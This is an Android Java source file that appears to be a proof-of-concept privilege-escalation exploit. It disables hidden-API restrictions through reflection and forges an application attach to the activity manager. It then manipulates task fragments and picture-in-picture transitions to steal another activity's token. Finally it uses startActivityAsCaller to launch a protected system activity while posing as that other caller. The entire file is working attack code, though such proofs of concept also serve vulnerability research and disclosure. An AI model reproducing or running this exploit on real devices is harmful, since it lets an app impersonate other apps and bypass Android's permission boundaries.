package com.example.otheractivitytoken;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.IActivityManager;
import android.app.IActivityTaskManager;
import android.app.IApplicationThread;
import android.app.PictureInPictureParams;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Process;
import android.os.RemoteException;
import android.util.Log;
import android.util.Property;
import android.view.View;
import android.widget.TextView;
import android.window.ITaskFragmentOrganizer;
import android.window.ITaskFragmentOrganizerController;
import android.window.TaskFragmentCreationParams;
import android.window.TaskFragmentOperation;
import android.window.TaskFragmentOrganizer;
import android.window.TaskFragmentTransaction;
import android.window.WindowContainerTransaction;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class MainActivity extends Activity {

    StringBuilder mTextBuilder = new StringBuilder();
    TextView mTextView;
    final Handler mHandler = new Handler();
    Step mStep = Step.IDLE;
    TaskFragmentOrganizer mTaskFragmentOrganizer;
    IBinder mFragmentToken;
    PipActivity mPipToFinish;
    CurtainActivity mCurtainToFinish;
    IBinder mOtherActivityToken;
    ServiceConnection mServiceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    };

    static {
        allowHiddenApis();
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mTextView = findViewById(R.id.output_text);
    }

    void log(String message) {
        Log.i("OtherActivityToken", message);
        mHandler.post(() -> {
            mTextBuilder.append(message).append("\n");
            mTextView.setText(mTextBuilder.toString());
        });
    }

    void advanceStep(Step oldStep, Step newStep) {
        if (mStep != oldStep) {
            throw new IllegalStateException("Invalid step, expected " + oldStep + ", got " + mStep);
        }
        log("Step: " + newStep);
        mStep = newStep;
    }

    static IBinder getActivityToken(Activity activity) {
        try {
            return (IBinder) Activity.class.getMethod("getActivityToken").invoke(activity);
        } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
    }

    public void startStuff(View view) {
        view.setEnabled(false);
        advanceStep(Step.IDLE, Step.ATTACHING_APP);
        sendOrderedBroadcast(new Intent(this, SeqReceiver.class), null, new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                try {
                    long lastSeq = Long.parseLong(getResultData());
                    bindService(new Intent(MainActivity.this, FakeService.class), mServiceConnection, BIND_AUTO_CREATE);
                    IActivityManager.Stub.asInterface(new ForceOneWay(
                            ((IInterface) ActivityManager.class.getMethod("getService").invoke(null)).asBinder()
                    )).attachApplication(IApplicationThread.Stub.asInterface(new AppThreadRelay()), lastSeq + 1);
                    mHandler.postDelayed(() -> proceedToRegisterOrganizer(), 500);
                } catch (ReflectiveOperationException | RemoteException e) {
                    throw new RuntimeException(e);
                }
            }
        }, mHandler, 0, null, null);
    }

    void proceedToRegisterOrganizer() {
        advanceStep(Step.ATTACHING_APP, Step.REGISTERING_ORGANIZER);
        mTaskFragmentOrganizer = new TaskFragmentOrganizer(Runnable::run) {
            @Override
            public void onTransactionReady(TaskFragmentTransaction transaction) {
                if (mStep == Step.EXITING_PIP) {
                    for (TaskFragmentTransaction.Change change : transaction.getChanges()) {
                        if (change.getType() == TaskFragmentTransaction.TYPE_ACTIVITY_REPARENTED_TO_TASK) {
                            mOtherActivityToken = change.getOtherActivityToken();
                            maybeProceedToFinish();
                            break;
                        }
                    }
                }
                super.onTransactionReady(transaction);
            }
        };
        try {
            Method getController = TaskFragmentOrganizer.class.getDeclaredMethod("getController");
            getController.setAccessible(true);
            ITaskFragmentOrganizerController controller = (ITaskFragmentOrganizerController) getController.invoke(mTaskFragmentOrganizer);
            Field remoteField = Class.forName("android.window.ITaskFragmentOrganizerController$Stub$Proxy").getDeclaredField("mRemote");
            remoteField.setAccessible(true);
            IBinder realRemote = (IBinder) remoteField.get(controller);
            remoteField.set(controller, new ForceOneWay(realRemote));
            boolean found = false;
            for (Method method : controller.getClass().getMethods()) {
                if ("registerOrganizer".equals(method.getName())) {
                    Class<?>[] parameterTypes = method.getParameterTypes();
                    Object[] args = new Object[parameterTypes.length];
                    for (int i = 1; i < parameterTypes.length; i++) {
                        if (parameterTypes[i] == boolean.class) {
                            args[i] = false;
                        }
                    }
                    args[0] = ITaskFragmentOrganizer.Stub.asInterface(mTaskFragmentOrganizer.getOrganizerToken().asBinder());
                    method.invoke(controller, args);
                    found = true;
                    break;
                }
            }
            if (!found) {
                throw new RuntimeException("Didn't find register method");
            }
            remoteField.set(controller, realRemote);
        } catch (ReflectiveOperationException e) {
            throw new RuntimeException(e);
        }
        mHandler.postDelayed(this::proceedToLaunchTasks, 500);
    }

    void proceedToLaunchTasks() {
        advanceStep(Step.REGISTERING_ORGANIZER, Step.USING_ORGANIZER);
        mFragmentToken = new Binder("FragmentToken");
        PipActivity.sResumeListener = this::proceedToEnterPip;
        mTaskFragmentOrganizer.applyTransaction(
                new WindowContainerTransaction()
                        .createTaskFragment(
                                new TaskFragmentCreationParams.Builder(
                                        mTaskFragmentOrganizer.getOrganizerToken(),
                                        mFragmentToken,
                                        getActivityToken(this)
                                ).build()
                        )
                        .startActivityInTaskFragment(
                                mFragmentToken,
                                getActivityToken(this),
                                new Intent(this, PipActivity.class),
                                null
                        ),
                0, false
        );
    }

    void proceedToEnterPip(PipActivity pipActivity) {
        advanceStep(Step.USING_ORGANIZER, Step.ENTERING_PIP);
        PipActivity.sPauseListener = pipActivity2 -> {
            if (pipActivity != pipActivity2) {
                throw new IllegalStateException();
            }
            PipActivity.sPauseListener = pipActivity3 -> {
                if (pipActivity == pipActivity3) {
                    throw new IllegalStateException();
                }
                proceedToExitPip();
            };
        };
        pipActivity.enterPictureInPictureMode(new PictureInPictureParams.Builder().build());
    }

    void proceedToExitPip() {
        advanceStep(Step.ENTERING_PIP, Step.EXITING_PIP);
        mPipToFinish = null;
        mCurtainToFinish = null;
        mOtherActivityToken = null;
        PipActivity.sResumeListener = pipActivity -> {
            mPipToFinish = pipActivity;
            maybeProceedToFinish();
        };
        CurtainActivity.sPauseListener = curtainActivity -> {
            mCurtainToFinish = curtainActivity;
            maybeProceedToFinish();
        };
        startActivity(new Intent().setClassName("android", "android.accounts.CantAddAccountActivity"));
        IBinder tempFragmentToken = new Binder("TempFragmentToken");
        mTaskFragmentOrganizer.applyTransaction(
                new WindowContainerTransaction()
                        .createTaskFragment(
                                new TaskFragmentCreationParams.Builder(
                                        mTaskFragmentOrganizer.getOrganizerToken(),
                                        tempFragmentToken,
                                        getActivityToken(this)
                                ).build()
                        )
                        .addTaskFragmentOperation(
                                mFragmentToken,
                                new TaskFragmentOperation.Builder(TaskFragmentOperation.OP_TYPE_REORDER_TO_FRONT).build()
                        )
                        .startActivityInTaskFragment(
                                mFragmentToken,
                                getActivityToken(this),
                                new Intent(this, CurtainActivity.class),
                                null
                        ),
                0, false
        );
        startActivity(new Intent(this, PipActivity.class).setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT));
    }

    void maybeProceedToFinish() {
        if (mStep == Step.EXITING_PIP && mPipToFinish != null && mCurtainToFinish != null && mOtherActivityToken != null) {
            advanceStep(Step.EXITING_PIP, Step.FINISHING_CURTAIN);
            mCurtainToFinish.finish();
            mCurtainToFinish = null;
            mPipToFinish.finish();
            mPipToFinish = null;
            mHandler.postDelayed(this::proceedToFinalLaunch, 500);
        }
    }

    void proceedToFinalLaunch() {
        advanceStep(Step.FINISHING_CURTAIN, Step.FINISHED);
        try {
            ((IActivityTaskManager) Class.forName("android.app.ActivityTaskManager")
                    .getMethod("getService")
                    .invoke(null)
            ).startActivityAsCaller(
                    null,
                    getPackageName(),
                    new Intent().setClassName("android", "com.android.internal.app.PlatLogoActivity"),
                    null,
                    mOtherActivityToken,
                    null,
                    -1,
                    0,
                    null,
                    null,
                    true,
                    Process.myUid() / 100000
            );
        } catch (ReflectiveOperationException | RemoteException e) {
            throw new RuntimeException(e);
        }
    }

    private static boolean sAllowHiddenApisDone;

    public static void allowHiddenApis() {
        if (sAllowHiddenApisDone) return;
        try {
            Method[] methods = Property.of(Class.class, Method[].class, "Methods").get(Class.forName("dalvik.system.VMRuntime"));
            Method setHiddenApiExemptions = null;
            Method getRuntime = null;
            for (Method method : methods) {
                if ("setHiddenApiExemptions".equals(method.getName())) {
                    setHiddenApiExemptions = method;
                }
                if ("getRuntime".equals(method.getName())) {
                    getRuntime = method;
                }
            }
            setHiddenApiExemptions.invoke(getRuntime.invoke(null), new Object[]{new String[]{"L"}});
        } catch (ReflectiveOperationException e) {
            throw new RuntimeException(e);
        }
        sAllowHiddenApisDone = true;
    }
}
